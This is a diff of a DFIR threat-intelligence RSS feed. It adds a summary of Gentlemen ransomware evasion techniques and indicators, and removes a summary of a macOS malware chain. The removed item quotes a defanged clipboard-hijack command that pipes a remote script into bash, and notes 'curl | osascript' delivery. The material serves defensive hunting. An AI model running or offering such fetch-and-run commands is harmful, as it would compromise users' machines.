@@ -5,8 +5,30 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The best DFIR research from hundreds of sources, filtered for relevance.</description>
     <language>en</language>
-    <lastBuildDate>Thu, 21 May 2026 22:03:31 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 21 May 2026 23:03:22 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>The Gentleman Ransomware | Defense Evasion TTPs Uncovered | Huntress</title>
+      <link>https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps</link>
+      <description>The Gentlemen ransomware operation, active since mid-2025 with 400+ victims across 70+ countries, uses sophisticated defense evasion including PowerShell-based Defender tampering, scheduled task persistence, and selective event log clearing.
+
+Key technical details:
+• Encryptors: win.exe and G_hlm7jj_windows_amd64.exe with custom command-line parameters (--password, --T 200, --superfast)
+• C2 infrastructure: 193.233.202[.]17:44729 and 77.110.122[.]137:37182 for SOCKS proxy persistence
+• Defense evasion: PowerShell commands to disable real-time monitoring, stop WinDefend service, add exclusions for C:\ drive
+• Persistence: Scheduled tasks disguised as svchost32.exe running every 2 minutes via SYSTEM account (T1053.005)
+• Log manipulation: Selective clearing of Security (1102), Application/System (104) logs while leaving other logs intact
+
+Artifacts include failed task execution patterns (TaskScheduler/101, 107, 203 events every 2 minutes), Defender detections (Trojan:Win32/MpTamperBulkExcl.H), and ransom notes (README-GENTLEMEN.txt with .fjn1jw extensions).
+
+Hunt for PowerShell Set-MpPreference commands, suspicious scheduled tasks with svchost variations, and workstation name WIN-8OA3CCQAE4D. Full IOC list available in Huntress GitHub repository.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2057598151054463036</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2057598151054463036">DFIR Radar</source>
+      <pubDate>Thu, 21 May 2026 23:03:22 +0000</pubDate>
+      <guid isPermaLink="false">2057598151054463036</guid>
+    </item>
     <item>
       <title>A New SonicWall Scanning Spike Echoes the Pattern That Preceded CVE-2026-0400</title>
       <link>https://www.greynoise.io/blog/sonicwall-scanning-spike-echoes-pattern-preceded-cve-2026-0400</link>
@@ -1718,29 +1740,6 @@ Hunt for DNS TXT queries with prefixes "xh", "xd", "xf" under bt[.]node[.]js dom
       <source url="https://x.com/DFIR_Radar/status/2055227393502048481">DFIR Radar</source>
       <pubDate>Fri, 15 May 2026 10:02:50 +0000</pubDate>
       <guid isPermaLink="false">2055227393502048481</guid>
-    </item>
-    <item>
-      <title>From Vercel Typosquatting to an Obfuscated macOS Malware Loader</title>
-      <link>https://infosecwriteups.com/from-vercel-typosquatting-to-an-obfuscated-macos-malware-loader-0949c7305a5a?source=rss----7b722bfd1b8d---4</link>
-      <description>Deep technical breakdown of sophisticated macOS malware delivery chain discovered through Vercel typosquatting. Campaign uses multi-stage JavaScript obfuscation, blockchain infrastructure discovery, and clipboard hijacking to deploy AppleScript loaders targeting designers and developers.
-
-Key technical details:
-• Initial vector: ux-dictionary[.]verce[.]app (missing 'l' in Vercel) redirects through xml-v4[.]giantpanda[.]media traffic broker
-• Fake "Browser Verification" page hijacks clipboard with: curl -s 'hxxps://1ymphstoy[.]digital/script[.]sh' | bash
-• Uses Polygon blockchain RPC (rpc-mainnet[.]matic[.]quiknode[.]pro) for dynamic C2 infrastructure discovery
-• Obfuscated AppleScript rebuilds strings using ASCII character/character id primitives to hide C2s: 9sxgrev[.]pro, axj0tw9[.]lol, jnoaxfwe[.]info
-• Telegram fallback (hxxps://t[.]me/ax03bot) provides resilient C2 rotation mechanism
-• Final payload delivered via: curl | osascript for memory-only execution
-
-Attack chain: Typosquatting → Traffic brokering → Browser fingerprinting → Social engineering → Clipboard manipulation → AppleScript loader → Remote payload execution
-
-DFIR artifacts: Monitor for osascript processes with network activity, clipboard API usage in browsers, and curl commands piped to bash/osascript. Check browser history for Vercel-adjacent typosquats.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2055212294359974257</description>
-      <category>MALWARE ANALYSIS</category>
-      <source url="https://x.com/DFIR_Radar/status/2055212294359974257">DFIR Radar</source>
-      <pubDate>Fri, 15 May 2026 09:02:50 +0000</pubDate>
-      <guid isPermaLink="false">2055212294359974257</guid>
     </item>
   </channel>
 </rss>
